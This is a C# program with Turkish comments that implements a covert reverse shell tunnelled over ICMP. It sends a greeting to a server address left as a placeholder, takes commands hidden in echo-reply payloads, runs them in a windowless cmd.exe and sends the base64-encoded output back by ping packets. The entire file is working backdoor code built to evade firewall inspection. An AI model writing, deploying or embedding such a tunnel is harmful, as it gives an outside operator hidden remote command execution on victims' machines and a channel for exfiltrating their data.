using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

class Program
{
    const int ICMP_ECHO = 8; // ICMP Echo Request
    const int ICMP_ECHO_REPLY = 0; // ICMP Echo Reply
    const int BUFFER_SIZE = 1024;
    private static Process cmdProcess;
    private static StreamWriter cmdStreamWriter;
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct ICMP
    {
        public byte Type;
        public byte Code;
        public ushort Checksum;
        public ushort Identifier;
        public ushort Sequence;
        public byte[] Data;
    }

    static ushort CalculateChecksum(byte[] buffer)
    {
        int length = buffer.Length;
        int index = 0;
        long sum = 0;

        while (length > 1)
        {
            sum += BitConverter.ToUInt16(buffer, index);
            index += 2;
            length -= 2;
        }

        if (length > 0)
            sum += buffer[index];

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);

        return (ushort)(~sum);
    }

    static byte[] CreateIcmpPacket(string message)
    {
        ICMP packet = new ICMP
        {
            Type = ICMP_ECHO,
            Code = 0,
            Identifier = (ushort)DateTime.Now.Millisecond,
            Sequence = 1,
            Data = Encoding.ASCII.GetBytes(message)
        };

        int headerSize = 8; // ICMP header size (Type, Code, Checksum, Identifier, Sequence)
        byte[] packetBytes = new byte[headerSize + packet.Data.Length];

        packetBytes[0] = packet.Type;
        packetBytes[1] = packet.Code;
        Array.Copy(BitConverter.GetBytes((ushort)0), 0, packetBytes, 2, 2); // Checksum initialized to 0
        Array.Copy(BitConverter.GetBytes(packet.Identifier), 0, packetBytes, 4, 2);
        Array.Copy(BitConverter.GetBytes(packet.Sequence), 0, packetBytes, 6, 2);
        Array.Copy(packet.Data, 0, packetBytes, 8, packet.Data.Length);

        ushort checksum = CalculateChecksum(packetBytes);
        Array.Copy(BitConverter.GetBytes(checksum), 0, packetBytes, 2, 2); // Insert checksum

        return packetBytes;
    }

    private static void StartCmdProcess()
    {
        cmdProcess = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            }
        };
        cmdProcess.Start();
        cmdStreamWriter = cmdProcess.StandardInput;
    }

    private static string ExecuteCommand(string command)
    {
        if (cmdProcess == null || cmdProcess.HasExited)
        {
            StartCmdProcess();
        }

        cmdStreamWriter.WriteLine(command);
        cmdStreamWriter.WriteLine("echo [CMD-END]");
        cmdStreamWriter.Flush();

        StringBuilder outputBuilder = new StringBuilder();
        string line;
        while ((line = cmdProcess.StandardOutput.ReadLine()) != "[CMD-END]")
        {
            outputBuilder.AppendLine(line);
        }

        return outputBuilder.ToString();
    }

    static void Main()
    {
        string message = "merhaba";
        byte[] packet = CreateIcmpPacket(Convert.ToBase64String(Encoding.UTF8.GetBytes(message)));

        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
        socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 50000);

        EndPoint serverEndpoint = new IPEndPoint(IPAddress.Parse("SERVER'ININ İP ADRESİNİ BURAYA YAZ"), 0);

        try
        {
            // Sunucuya 'merhaba' mesajı gönderiliyor
            socket.SendTo(packet, serverEndpoint);
            Console.WriteLine("Server'a 'merhaba' mesajı gönderildi.");
            while (true)
            {
                // Sunucudan yanıt bekleniyor
                byte[] buffer = new byte[BUFFER_SIZE];
                EndPoint receiveEndpoint = new IPEndPoint(IPAddress.Any, 0);
                Console.WriteLine("Waiting");
                int receivedBytes = socket.ReceiveFrom(buffer, ref receiveEndpoint);
                Console.WriteLine("Not waiting");
                if (receivedBytes > 0)
                {
                    // Gelen verinin türü ve kontrolü
                    int icmpType = buffer[20]; // ICMP header'dan gelen tür
                    if (icmpType == ICMP_ECHO_REPLY)
                    {
                        string responseData = Encoding.ASCII.GetString(buffer, 28, receivedBytes - 28); // 28 byte header'ı atla
                        try
                        {
                            var decodedResponse = Encoding.UTF8.GetString(Convert.FromBase64String(responseData));
                            Console.WriteLine("Server'dan gelen mesaj: " + decodedResponse);
                            string commandResult = ExecuteCommand(decodedResponse);
                            byte[] output = CreateIcmpPacket(Convert.ToBase64String(Encoding.UTF8.GetBytes(commandResult)));
                            socket.SendTo(output, serverEndpoint);
                        }
                        catch (FormatException)
                        {
                            Console.WriteLine("Hatalı Base64 dizisi alındı: " + responseData);
                        }
                    }
                    else
                    {
                        Console.WriteLine("Beklenmeyen ICMP tipi alındı.");
                    }
                }
            }
        }
        catch (SocketException ex)
        {
            Console.WriteLine("SocketException: " + ex.Message);
        }
        finally
        {
            socket.Close();
        }
    }
}
